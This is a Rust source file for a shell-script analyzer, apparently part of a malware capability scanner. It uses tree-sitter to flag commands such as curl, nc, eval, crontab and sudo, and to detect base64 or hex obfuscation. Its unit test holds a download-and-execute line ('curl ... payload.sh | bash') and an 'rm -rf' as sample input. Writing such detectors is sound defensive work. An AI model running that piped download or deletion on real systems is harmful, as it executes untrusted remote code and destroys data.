use crate::analyzers::Analyzer;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::{Parser, Query, QueryCursor};

/// Shell script analyzer using tree-sitter
pub struct ShellAnalyzer {
    parser: RefCell<Parser>,
}

impl ShellAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();

        Self { parser: RefCell::new(parser) }
    }

    fn analyze_script(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the shell script
        let tree = self.parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse shell script")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "shell_script".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/shell".to_string(),
            description: "Shell script".to_string(),
            evidence: vec![Evidence {
                method: "shebang".to_string(),
                source: "tree-sitter-bash".to_string(),
                value: content.lines().next().unwrap_or("").to_string(),
                location: Some("line:1".to_string()),
            }],
        });

        // Detect capabilities by traversing AST
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Detect shell idioms
        let shell_idioms = self.detect_shell_idioms(&root, content.as_bytes());

        // Add idioms to source code metrics if they exist
        if let Some(ref mut metrics) = report.source_code_metrics {
            metrics.shell_idioms = Some(shell_idioms);
        }

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-bash".to_string()];

        Ok(report)
    }

    fn detect_capabilities(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let mut cursor = node.walk();

        // Walk the AST looking for command invocations
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(&self, cursor: &mut tree_sitter::TreeCursor, source: &[u8], report: &mut AnalysisReport) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "command" => {
                    if let Some(name_node) = node.child_by_field_name("name") {
                        if let Ok(cmd_name) = name_node.utf8_text(source) {
                            self.analyze_command(cmd_name, &node, source, report);
                        }
                    }
                }
                "function_definition" => {
                    // Already handled by extract_functions
                }
                "variable_assignment" => {
                    self.check_obfuscation(&node, source, report);
                }
                _ => {}
            }

            // Recurse into children
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_command(&self, cmd: &str, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let capability = match cmd {
            "curl" | "wget" => {
                Some(("net/http/client", "Download files via HTTP"))
            }
            "nc" | "netcat" => {
                Some(("net/socket/connect", "Network socket connections"))
            }
            "exec" | "eval" => {
                Some(("exec/script/eval", "Execute dynamic code"))
            }
            "sh" | "bash" | "zsh" => {
                Some(("exec/command/shell", "Execute shell commands"))
            }
            "rm" | "unlink" => {
                Some(("fs/delete", "Delete files"))
            }
            "chmod" | "chown" => {
                Some(("fs/permissions", "Modify file permissions"))
            }
            "crontab" => {
                Some(("persistence/cron", "Schedule tasks with cron"))
            }
            "systemctl" | "service" => {
                Some(("persistence/service", "Manage system services"))
            }
            "sudo" => {
                Some(("privilege/escalation", "Execute with elevated privileges"))
            }
            _ => None,
        };

        if let Some((cap_id, description)) = capability {
            // Check if we already have this capability
            if !report.capabilities.iter().any(|c| c.id == cap_id) {
                report.capabilities.push(Capability {
                    id: cap_id.to_string(),
                    description: description.to_string(),
                    confidence: 1.0,
                        criticality: Criticality::None,
                    mbc_id: None,
                    attack_id: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: cmd.to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                traits: Vec::new(),
                referenced_paths: None,
                referenced_directories: None,
                });
            }
        }
    }

    fn check_obfuscation(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            // Check for base64 encoding patterns
            if text.contains("base64") || text.contains("b64decode") {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/base64") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/base64".to_string(),
                        description: "Uses base64 encoding/decoding".to_string(),
                        confidence: 0.9,
                        criticality: Criticality::None,
                        mbc_id: None,
                        attack_id: None,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "base64".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                    });
                }
            }

            // Check for hex encoding
            if text.contains("\\x") && text.matches("\\x").count() > 3 {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/hex") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/hex".to_string(),
                        description: "Uses hex-encoded strings".to_string(),
                        confidence: 0.9,
                        criticality: Criticality::None,
                        mbc_id: None,
                        attack_id: None,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "hex_encoding".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                    });
                }
            }

            // Check for eval with variable (dynamic code execution)
            if (text.contains("eval") || text.contains("exec")) && text.contains("$") {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/dynamic-eval") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/dynamic-eval".to_string(),
                        description: "Executes dynamically constructed code".to_string(),
                        confidence: 0.95,
                        criticality: Criticality::None,
                        mbc_id: None,
                        attack_id: None,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "eval_with_variable".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                    });
                }
            }
        }
    }

    /// Calculate cyclomatic complexity for a shell function
    fn calculate_cyclomatic_complexity(&self, node: &tree_sitter::Node, source: &[u8]) -> u32 {
        let mut complexity = 1; // Base complexity
        let mut cursor = node.walk();

        loop {
            let current = cursor.node();
            match current.kind() {
                "if_statement" => complexity += 1,
                "case_statement" | "case_item" => complexity += 1,
                "for_statement" | "c_style_for_statement" => complexity += 1,
                "while_statement" | "until_statement" => complexity += 1,
                "elif_clause" => complexity += 1,
                "test_command" => {
                    // Count && and || in test commands
                    if let Ok(text) = current.utf8_text(source) {
                        complexity += text.matches("&&").count() as u32;
                        complexity += text.matches("||").count() as u32;
                    }
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return complexity;
                }
            }
        }
    }

    /// Analyze function signature for shell functions
    fn analyze_function_signature(&self, node: &tree_sitter::Node, _source: &[u8]) -> FunctionSignature {
        // Shell functions don't have explicit parameter declarations
        // Parameters are accessed via $1, $2, etc.
        FunctionSignature {
            param_count: 0, // Not explicitly declared in shell
            default_param_count: 0,
            has_var_positional: false, // Shell uses $@
            has_var_keyword: false,
            has_type_hints: false,
            has_return_type: false,
            decorators: Vec::new(),
            is_async: false, // Shell has background jobs but not async in the modern sense
            is_generator: false,
            is_lambda: false,
        }
    }

    /// Calculate nesting depth of control structures
    fn calculate_nesting_depth(&self, node: &tree_sitter::Node) -> NestingMetrics {
        let mut max_depth = 0u32;
        let mut depths = Vec::new();
        let mut deep_nest_count = 0u32;

        fn traverse(node: &tree_sitter::Node, current_depth: u32, max: &mut u32,
                    depths: &mut Vec<u32>, deep: &mut u32) {
            let mut depth = current_depth;
            match node.kind() {
                "if_statement" | "case_statement" | "for_statement" |
                "while_statement" | "until_statement" | "subshell" => {
                    depth += 1;
                    depths.push(depth);
                    if depth > *max {
                        *max = depth;
                    }
                    if depth > 4 {
                        *deep += 1;
                    }
                }
                _ => {}
            }

            // Recurse through children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                traverse(&child, depth, max, depths, deep);
            }
        }

        traverse(node, 0, &mut max_depth, &mut depths, &mut deep_nest_count);

        NestingMetrics {
            max_depth,
            avg_depth: if !depths.is_empty() {
                depths.iter().sum::<u32>() as f32 / depths.len() as f32
            } else {
                0.0
            },
            deep_nest_count,
        }
    }

    /// Analyze call patterns in shell functions
    fn analyze_call_patterns(&self, node: &tree_sitter::Node, source: &[u8], func_name: &str) -> CallPatternMetrics {
        let mut call_count = 0u32;
        let mut callees: Vec<String> = Vec::new();
        let mut recursive_calls = 0u32;
        let mut dynamic_calls = 0u32;

        let mut cursor = node.walk();
        loop {
            let current = cursor.node();
            if current.kind() == "command" {
                call_count += 1;

                if let Some(name_node) = current.child_by_field_name("name") {
                    if let Ok(cmd_text) = name_node.utf8_text(source) {
                        let cmd_str = cmd_text.to_string();
                        callees.push(cmd_str.clone());

                        // Check recursion
                        if cmd_str == func_name {
                            recursive_calls += 1;
                        }

                        // Check dynamic calls (eval, source with variables)
                        if ["eval", "source", "."].iter().any(|&d| cmd_str.contains(d)) {
                            // Check if there's a variable expansion
                            if let Ok(full_text) = current.utf8_text(source) {
                                if full_text.contains('$') {
                                    dynamic_calls += 1;
                                }
                            }
                        }
                    }
                }
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    callees.sort();
                    callees.dedup();

                    return CallPatternMetrics {
                        call_count,
                        unique_callees: callees.len() as u32,
                        chained_calls: 0, // Shell uses pipes, not method chaining
                        max_chain_length: 0,
                        recursive_calls,
                        dynamic_calls,
                    };
                }
            }
        }
    }

    /// Detect shell-specific idioms
    fn detect_shell_idioms(&self, root: &tree_sitter::Node, source: &[u8]) -> ShellIdioms {
        let mut pipe_count = 0u32;
        let mut redirect_count = 0u32;
        let mut input_redirect_count = 0u32;
        let mut command_substitution_count = 0u32;
        let mut heredoc_count = 0u32;
        let mut case_statement_count = 0u32;
        let mut test_expression_count = 0u32;
        let mut while_read_count = 0u32;
        let mut subshell_count = 0u32;
        let mut for_loop_count = 0u32;
        let mut background_job_count = 0u32;
        let mut process_substitution_count = 0u32;

        let mut cursor = root.walk();
        loop {
            let node = cursor.node();
            match node.kind() {
                "pipeline" => {
                    // Count pipes in the pipeline
                    if let Ok(text) = node.utf8_text(source) {
                        pipe_count += text.matches('|').count() as u32;
                    }
                }
                "redirected_statement" | "file_redirect" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains('>') {
                            redirect_count += 1;
                        }
                        if text.contains('<') && !text.contains("<<") {
                            input_redirect_count += 1;
                        }
                    }
                }
                "command_substitution" => {
                    command_substitution_count += 1;
                }
                "heredoc_redirect" => {
                    heredoc_count += 1;
                }
                "case_statement" => {
                    case_statement_count += 1;
                }
                "test_command" | "bracket_command" => {
                    test_expression_count += 1;
                }
                "while_statement" => {
                    // Check if it's a while read loop
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("read") {
                            while_read_count += 1;
                        }
                    }
                }
                "subshell" => {
                    subshell_count += 1;
                }
                "for_statement" | "c_style_for_statement" => {
                    for_loop_count += 1;
                }
                "command" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.ends_with('&') {
                            background_job_count += 1;
                        }
                    }
                }
                "process_substitution" => {
                    process_substitution_count += 1;
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return ShellIdioms {
                        pipe_count,
                        redirect_count,
                        input_redirect_count,
                        command_substitution_count,
                        heredoc_count,
                        case_statement_count,
                        test_expression_count,
                        while_read_count,
                        subshell_count,
                        for_loop_count,
                        background_job_count,
                        process_substitution_count,
                    };
                }
            }
        }
    }

    fn extract_functions(&self, root: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();

            if node.kind() == "function_definition" {
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(func_name) = name_node.utf8_text(source) {
                        let func_name_str = func_name.to_string();

                        // Calculate all metrics
                        let complexity = self.calculate_cyclomatic_complexity(&node, source);
                        let signature = self.analyze_function_signature(&node, source);
                        let nesting = self.calculate_nesting_depth(&node);
                        let call_patterns = self.analyze_call_patterns(&node, source, &func_name_str);

                        // Extract command calls
                        let mut calls = Vec::new();
                        let mut call_cursor = node.walk();
                        loop {
                            let call_node = call_cursor.node();
                            if call_node.kind() == "command" {
                                if let Some(cmd_name_node) = call_node.child_by_field_name("name") {
                                    if let Ok(cmd_text) = cmd_name_node.utf8_text(source) {
                                        calls.push(cmd_text.to_string());
                                    }
                                }
                            }
                            if call_cursor.goto_first_child() {
                                continue;
                            }
                            loop {
                                if call_cursor.goto_next_sibling() {
                                    break;
                                }
                                if !call_cursor.goto_parent() {
                                    break;
                                }
                            }
                            if call_cursor.node() == node {
                                break;
                            }
                        }
                        calls.sort();
                        calls.dedup();

                        // Build control flow metrics
                        let control_flow = ControlFlowMetrics {
                            basic_blocks: complexity,
                            edges: if complexity > 1 { complexity + 1 } else { 1 },
                            cyclomatic_complexity: complexity,
                            max_block_size: 0,
                            avg_block_size: 0.0,
                            is_linear: complexity == 1,
                            loop_count: 0,
                            branch_density: 0.0,
                            in_degree: 0,
                            out_degree: call_patterns.unique_callees,
                        };

                        // Build properties
                        let properties = FunctionProperties {
                            is_pure: false,
                            is_noreturn: false,
                            is_recursive: call_patterns.recursive_calls > 0,
                            stack_frame: 0,
                            local_vars: 0,
                            args: signature.param_count,
                            is_leaf: call_patterns.call_count == 0,
                        };

                        report.functions.push(Function {
                            name: func_name_str,
                            offset: Some(format!("line:{}", node.start_position().row + 1)),
                            size: Some((node.end_byte() - node.start_byte()) as u64),
                            complexity: Some(complexity),
                            calls,
                            source: "tree-sitter-bash".to_string(),
                            control_flow: Some(control_flow),
                            instruction_analysis: None,
                            register_usage: None,
                            constants: Vec::new(),
                            properties: Some(properties),
                            call_patterns: Some(call_patterns),
                            nesting: Some(nesting),
                            signature: Some(signature),
                        });
                    }
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                continue;
            }

            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Default for ShellAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for ShellAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path)
            .context("Failed to read shell script")?;

        self.analyze_script(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        if let Ok(data) = fs::read(file_path) {
            data.starts_with(b"#!/bin/sh") || data.starts_with(b"#!/bin/bash") || data.starts_with(b"#!/usr/bin/env bash")
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_simple_script() {
        let script = r#"#!/bin/bash
curl https://example.com/payload.sh | bash
rm -rf /tmp/test
"#;

        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(script.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        let report = analyzer.analyze(temp_file.path()).unwrap();

        // Should detect curl, bash, and rm capabilities
        assert!(report.capabilities.len() >= 2);
        assert!(report.capabilities.iter().any(|c| c.id.contains("http")));
        assert!(report.capabilities.iter().any(|c| c.id.contains("delete")));
    }
}
